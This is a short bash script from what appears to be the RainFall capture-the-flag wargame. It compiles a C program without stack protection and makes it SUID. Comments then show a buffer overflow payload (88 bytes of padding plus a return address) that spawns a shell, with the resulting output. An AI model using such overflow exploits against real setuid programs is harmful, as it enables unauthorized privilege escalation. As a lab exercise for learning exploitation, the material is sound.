#!/bin/bash

# make sure you send pathto/script.sh and pathto/source.c to the VM
cd /tmp

gcc -fno-stack-protector source.c -o test 

# set SUID
chmod u+s test

# and then run the program (I found 88 as perfect offset)

# level1@RainFall:/tmp$ (python -c 'print "A" * 88 + "\x64\x84\x04\x08"'; cat) | ./test
# Good... Wait what?
# whoami
# level1
#
